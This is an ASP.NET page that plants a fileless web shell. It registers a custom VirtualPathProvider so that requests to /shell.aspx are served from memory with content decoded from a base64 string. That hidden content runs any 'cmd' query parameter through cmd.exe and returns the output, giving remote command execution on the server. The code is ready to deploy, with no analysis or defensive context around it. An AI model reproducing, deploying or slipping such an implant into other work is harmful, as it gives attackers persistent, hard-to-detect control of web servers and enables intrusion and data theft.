<%@ Page Language="c#" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Web.Hosting" %>
<%@ Import Namespace="System.Web.Mvc" %>
<%@ Import Namespace="System.Web.Routing" %>

<script runat="server">
    public class SamplePathProvider : System.Web.Hosting.VirtualPathProvider
    {
        private string _virtualDir;
        private string _fileContent;

        public SamplePathProvider(string virtualDir, string fileContent)
            : base()
        {
            _virtualDir = virtualDir;
            _fileContent = fileContent;
        }

        private bool IsPathVirtual(string virtualPath)
        {
            System.String checkPath = System.Web.VirtualPathUtility.ToAppRelative(virtualPath);
            return checkPath.ToLower().Contains(_virtualDir.ToLower());
        }

        public override bool FileExists(string virtualPath)
        {
            if (IsPathVirtual(virtualPath))
            {
                return true;
            }
            else
            {
                return Previous.FileExists(virtualPath);
            }
        }


        public override System.Web.Hosting.VirtualFile GetFile(string virtualPath)
        {
            if (IsPathVirtual(virtualPath))
                return new SampleVirtualFile(virtualPath, _fileContent);
            else
                return Previous.GetFile(virtualPath);
        }
    }

    public class SampleVirtualFile : System.Web.Hosting.VirtualFile
    {
        private string _fileContent;

        public bool Exists
        {
            get { return true; }
        }

        public SampleVirtualFile(string virtualPath, string fileContent)
            : base(virtualPath)
        {
            this._fileContent = fileContent;
        }

        public override System.IO.Stream Open()
        {
            System.IO.Stream stream = new System.IO.MemoryStream(System.Text.Encoding.UTF8.GetBytes(_fileContent));
            return stream;
        }
    }
</script>

<% 
    string webshellContentsBase64 = "U0hFTEwgUExTCjwlQCBQYWdlIExhbmd1YWdlPSJjIyIgJT4KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5EaWFnbm9zdGljcyIgJT4KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5SZWZsZWN0aW9uIiAlPgo8JUAgSW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLldlYi5Ib3N0aW5nIiAlPgo8JUAgSW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLldlYi5NdmMiICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uV2ViLlJvdXRpbmciICU+Cgo8JQoJICAgIHRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBIdHRwQ29udGV4dCBjb250ZXh0ID0gSHR0cENvbnRleHQuQ3VycmVudDsKICAgICAgICAgICAgICAgIFN0cmluZyBjbWQgPSBjb250ZXh0LlJlcXVlc3QuUXVlcnlTdHJpbmdbImNtZCJdOwogICAgICAgICAgICAgICAgaWYgKGNtZCAhPSBudWxsKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIEh0dHBSZXNwb25zZUJhc2UgcmVzcG9uc2UgPSBuZXcgSHR0cFJlc3BvbnNlV3JhcHBlcihjb250ZXh0LlJlc3BvbnNlKTsKICAgICAgICAgICAgICAgICAgICBQcm9jZXNzIHAgPSBuZXcgUHJvY2VzcygpOwogICAgICAgICAgICAgICAgICAgIHAuU3RhcnRJbmZvLkZpbGVOYW1lID0gImNtZC5leGUiOwogICAgICAgICAgICAgICAgICAgIHAuU3RhcnRJbmZvLkFyZ3VtZW50cyA9ICIvYyAiICsgY21kOwogICAgICAgICAgICAgICAgICAgIHAuU3RhcnRJbmZvLlVzZVNoZWxsRXhlY3V0ZSA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIHAuU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgIHAuU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRFcnJvciA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgcC5TdGFydCgpOwogICAgICAgICAgICAgICAgICAgIGJ5dGVbXSBkYXRhID0gRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhwLlN0YW5kYXJkT3V0cHV0LlJlYWRUb0VuZCgpICsgcC5TdGFuZGFyZEVycm9yLlJlYWRUb0VuZCgpKTsKICAgICAgICAgICAgICAgICAgICByZXNwb25zZS5Xcml0ZShTeXN0ZW0uVGV4dC5FbmNvZGluZy5EZWZhdWx0LkdldFN0cmluZyhkYXRhKSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlKQogICAgICAgICAgICB7CgkJICAgIENvbnNvbGUuV3JpdGVMaW5lKGUpOwogICAgICAgICAgICB9CiU+";
    string webshellType = ".aspx";
    string webshellContent = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(webshellContentsBase64));
    string targetVirtualPath = "/shell.aspx";
    try
    {
        SamplePathProvider sampleProvider = new SamplePathProvider(targetVirtualPath, webshellContent);
        HostingEnvironment.RegisterVirtualPathProvider(sampleProvider);
        sampleProvider.InitializeLifetimeService();
    }
    catch (System.Exception error)
    {
        Console.WriteLine(error);
    }
%>